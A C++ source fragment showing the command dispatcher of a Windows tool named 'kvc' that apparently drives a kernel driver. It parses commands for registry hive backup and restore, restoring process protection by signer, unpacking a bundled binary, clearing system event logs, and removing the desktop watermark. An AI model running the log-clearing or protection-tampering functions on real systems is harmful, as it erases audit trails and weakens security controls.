                ERROR(L"Missing registry subcommand: backup, restore, defrag");
                return 1;
            }
            
            std::wstring_view subcommand = argv[2];
            HiveManager hiveManager;
            
            if (subcommand == L"backup") {
                std::wstring targetPath;
                if (argc >= 4)
                    targetPath = argv[3];
                
                return hiveManager.Backup(targetPath) ? 0 : 2;
            }
            else if (subcommand == L"restore") {
                if (argc < 4) {
                    ERROR(L"Missing source path for restore");
                    return 1;
                }
                
                std::wstring sourcePath = argv[3];
                return hiveManager.Restore(sourcePath) ? 0 : 2;
            }
            else if (subcommand == L"defrag") {
                std::wstring tempPath;
                if (argc >= 4)
                    tempPath = argv[3];
                
                return hiveManager.Defrag(tempPath) ? 0 : 2;
            }
            else {
                ERROR(L"Unknown registry subcommand: %s", subcommand.data());
                return 1;
            }
        }
        
        // ====================================================================
        // SESSION MANAGEMENT
        // ====================================================================
        
        else if (command == L"restore") {
            if (argc < 3) {
                ERROR(L"Missing argument: <signer_name|all>");
                return 1;
            }
            
            std::wstring_view target = argv[2];
            
            if (target == L"all") {
                return g_controller->RestoreAllProtection() ? 0 : 2;
            } else {
                std::wstring signerName(target);
                return g_controller->RestoreProtectionBySigner(signerName) ? 0 : 2;
            }
        }
        
        else if (command == L"history") {
            g_controller->ShowSessionHistory();
            return 0;
        }
        
        else if (command == L"cleanup-sessions") {
            g_controller->m_sessionMgr.CleanupAllSessionsExceptCurrent();
            return 0;
        }
        
        // ====================================================================
        // ADVANCED OPERATIONS
        // ====================================================================
        
        else if (command == L"setup") {
            INFO(L"Loading and processing kvc.dat combined binary...");
            return g_controller->LoadAndSplitCombinedBinaries() ? 0 : 2;
        }
        
        else if (command == L"evtclear") {
            return g_controller->ClearSystemEventLogs() ? 0 : 2;
        }
		
		// ====================================================================
		// WATERMARK MANAGEMENT
		// ====================================================================

		else if (command == L"watermark" || command == L"wm") {
			if (argc < 3) {
				ERROR(L"Missing subcommand. Usage: kvc watermark <remove|restore|status>");
				return 1;
			}
			
			std::wstring_view subCommand = argv[2];
			
			if (subCommand == L"remove") {
				INFO(L"Removing Windows desktop watermark...");
				return g_controller->RemoveWatermark() ? 0 : 2;
			}
			else if (subCommand == L"restore") {
				INFO(L"Restoring Windows desktop watermark...");
				return g_controller->RestoreWatermark() ? 0 : 2;
			}
			else if (subCommand == L"status") {
				std::wstring status = g_controller->GetWatermarkStatus();
				INFO(L"Watermark status: %s", status.c_str());
				return 0;
			}
			else {
				ERROR(L"Unknown watermark subcommand: %s", subCommand.data());
				return 1;
			}
		}
		
        // ====================================================================
        // UNKNOWN COMMAND
        // ====================================================================
        
        else {
            HelpSystem::PrintUnknownCommandMessage(command);
            return 1;
        }
    }
    catch (const std::exception& e) {
        std::string msg = e.what();
        std::wstring wmsg(msg.begin(), msg.end());
        ERROR(L"Exception: %s", wmsg.c_str());
        CleanupDriver();
        return 3;
    }
    catch (...) {
        ERROR(L"Unknown exception occurred");
        CleanupDriver();
        return 3;
    }

    CleanupDriver();
    return 0;
}